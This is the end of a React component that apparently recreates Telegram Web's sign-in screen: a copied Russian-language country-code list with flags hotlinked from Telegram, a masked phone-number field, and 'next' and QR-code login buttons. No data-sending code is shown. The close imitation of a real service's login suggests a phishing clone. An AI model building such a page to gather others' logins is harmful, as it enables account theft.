                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1fb.png" className="emoji" alt="🇹🇻"
                                                            data-path="./img-apple-160/1f1f9-1f1fb.png" draggable="false" /></span><span
                                                                className="country-name">Тувалу</span><span className="country-code">+688</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1f3.png" className="emoji" alt="🇹🇳"
                                                            data-path="./img-apple-160/1f1f9-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Тунис</span><span className="country-code">+216</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1f2.png" className="emoji" alt="🇹🇲"
                                                            data-path="./img-apple-160/1f1f9-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Туркменистан</span><span className="country-code">+993</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1f7.png" className="emoji" alt="🇹🇷"
                                                            data-path="./img-apple-160/1f1f9-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Турция</span><span className="country-code">+90</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fa-1f1ec.png" className="emoji" alt="🇺🇬"
                                                            data-path="./img-apple-160/1f1fa-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Уганда</span><span className="country-code">+256</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fa-1f1ff.png" className="emoji" alt="🇺🇿"
                                                            data-path="./img-apple-160/1f1fa-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Узбекистан</span><span className="country-code">+998</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fa-1f1e6.png" className="emoji" alt="🇺🇦"
                                                            data-path="./img-apple-160/1f1fa-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Украина</span><span className="country-code">+380</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fc-1f1eb.png" className="emoji" alt="🇼🇫"
                                                            data-path="./img-apple-160/1f1fc-1f1eb.png" draggable="false" /></span><span className="country-name">Уоллис
                                                                и Футуна</span><span className="country-code">+681</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fa-1f1fe.png" className="emoji" alt="🇺🇾"
                                                            data-path="./img-apple-160/1f1fa-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Уругвай</span><span className="country-code">+598</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1eb-1f1f4.png" className="emoji" alt="🇫🇴"
                                                            data-path="./img-apple-160/1f1eb-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Фарерские острова</span><span className="country-code">+298</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1eb-1f1ef.png" className="emoji" alt="🇫🇯"
                                                            data-path="./img-apple-160/1f1eb-1f1ef.png" draggable="false" /></span><span
                                                                className="country-name">Фиджи</span><span className="country-code">+679</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1ed.png" className="emoji" alt="🇵🇭"
                                                            data-path="./img-apple-160/1f1f5-1f1ed.png" draggable="false" /></span><span
                                                                className="country-name">Филиппины</span><span className="country-code">+63</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1eb-1f1ee.png" className="emoji" alt="🇫🇮"
                                                            data-path="./img-apple-160/1f1eb-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Финляндия</span><span className="country-code">+358</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1eb-1f1f0.png" className="emoji" alt="🇫🇰"
                                                            data-path="./img-apple-160/1f1eb-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Фолклендские острова</span><span className="country-code">+500</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1eb-1f1f7.png" className="emoji" alt="🇫🇷"
                                                            data-path="./img-apple-160/1f1eb-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Франция</span><span className="country-code">+33</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1eb.png" className="emoji" alt="🇵🇫"
                                                            data-path="./img-apple-160/1f1f5-1f1eb.png" draggable="false" /></span><span
                                                                className="country-name">Французская Полинезия</span><span className="country-code">+689</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ed-1f1f7.png" className="emoji" alt="🇭🇷"
                                                            data-path="./img-apple-160/1f1ed-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Хорватия</span><span className="country-code">+385</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1eb.png" className="emoji" alt="🇨🇫"
                                                            data-path="./img-apple-160/1f1e8-1f1eb.png" draggable="false" /></span><span
                                                                className="country-name">ЦАР</span><span className="country-code">+236</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1e9.png" className="emoji" alt="🇹🇩"
                                                            data-path="./img-apple-160/1f1f9-1f1e9.png" draggable="false" /></span><span
                                                                className="country-name">Чад</span><span className="country-code">+235</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1ea.png" className="emoji" alt="🇲🇪"
                                                            data-path="./img-apple-160/1f1f2-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Черногория</span><span className="country-code">+382</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1ff.png" className="emoji" alt="🇨🇿"
                                                            data-path="./img-apple-160/1f1e8-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Чехия</span><span className="country-code">+420</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1f1.png" className="emoji" alt="🇨🇱"
                                                            data-path="./img-apple-160/1f1e8-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Чили</span><span className="country-code">+56</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1ed.png" className="emoji" alt="🇨🇭"
                                                            data-path="./img-apple-160/1f1e8-1f1ed.png" draggable="false" /></span><span
                                                                className="country-name">Швейцария</span><span className="country-code">+41</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1ea.png" className="emoji" alt="🇸🇪"
                                                            data-path="./img-apple-160/1f1f8-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Швеция</span><span className="country-code">+46</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1f0.png" className="emoji" alt="🇱🇰"
                                                            data-path="./img-apple-160/1f1f1-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Шри-Ланка</span><span className="country-code">+94</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ea-1f1e8.png" className="emoji" alt="🇪🇨"
                                                            data-path="./img-apple-160/1f1ea-1f1e8.png" draggable="false" /></span><span
                                                                className="country-name">Эквадор</span><span className="country-code">+593</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1f6.png" className="emoji" alt="🇬🇶"
                                                            data-path="./img-apple-160/1f1ec-1f1f6.png" draggable="false" /></span><span
                                                                className="country-name">Экваториальная Гвинея</span><span className="country-code">+240</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ea-1f1f7.png" className="emoji" alt="🇪🇷"
                                                            data-path="./img-apple-160/1f1ea-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Эритрея</span><span className="country-code">+291</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1ff.png" className="emoji" alt="🇸🇿"
                                                            data-path="./img-apple-160/1f1f8-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Эсватини</span><span className="country-code">+268</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ea-1f1ea.png" className="emoji" alt="🇪🇪"
                                                            data-path="./img-apple-160/1f1ea-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Эстония</span><span className="country-code">+372</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ea-1f1f9.png" className="emoji" alt="🇪🇹"
                                                            data-path="./img-apple-160/1f1ea-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Эфиопия</span><span className="country-code">+251</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ff-1f1e6.png" className="emoji" alt="🇿🇦"
                                                            data-path="./img-apple-160/1f1ff-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">ЮАР</span><span className="country-code">+27</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1f7.png" className="emoji" alt="🇰🇷"
                                                            data-path="./img-apple-160/1f1f0-1f1f7.png" draggable="false" /></span><span className="country-name">Южная
                                                                Корея</span><span className="country-code">+82</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f8.png" className="emoji" alt="🇸🇸"
                                                            data-path="./img-apple-160/1f1f8-1f1f8.png" draggable="false" /></span><span className="country-name">Южный
                                                                Судан</span><span className="country-code">+211</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ef-1f1f2.png" className="emoji" alt="🇯🇲"
                                                            data-path="./img-apple-160/1f1ef-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Ямайка</span><span className="country-code">+1876</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ef-1f1f5.png" className="emoji" alt="🇯🇵"
                                                            data-path="./img-apple-160/1f1ef-1f1f5.png" draggable="false" /></span><span
                                                                className="country-name">Япония</span><span className="country-code">+81</span></div>
                                                    </div>
                                                </div>
                                            </div> */}
                                                {/* <div className="input-group with-label">
                                                <input className="form-control" type="text" id="sign-in-phone-number" dir="auto" inputMode="tel" aria-label="Your phone number" />
                                                <label for="sign-in-phone-number">Номер телефона</label>
                                            </div> */}

                                                <div className="input-group with-label">
                                                    <InputMask
                                                        required="required"
                                                        className="form-control"
                                                        type="text"
                                                        id="sign-in-phone-number"
                                                        dir="auto"
                                                        inputMode="tel"
                                                        aria-label="Your phone number"
                                                        mask="+9 999 999 99 99"
                                                        maskChar=""
                                                        value={phoneNumber} // Устанавливаем значение из состояния в инпут
                                                        onChange={handleInputChange} // Обработчик изменения значения инпута
                                                    />
                                                    <label htmlFor="sign-in-phone-number">Номер телефона</label>
                                                </div>


                                                <label className="Checkbox">
                                                    <input type="checkbox" id="sign-in-keep-session" />
                                                    <div className="Checkbox-main">
                                                        <span className="label" dir="auto">Запомнить меня</span>
                                                    </div>
                                                </label>

                                                <button type="button" className="pr Button default primary has-ripple" onClick={handleSetShowStep2}>
                                                    Далее
                                                    <div className="ripple-container"></div>
                                                </button>

                                                <button type="button" className="Button default primary text has-ripple" onClick={handleSetQR}>
                                                    Вход по QR-коду
                                                    <div className="ripple-container"></div>
                                                </button>
                                            </form>
                                        </div>
                                    </div>
                                )
                            )
                        )
                    )}
                </Modal>
            </div>
        </>
    );
}

export default App;
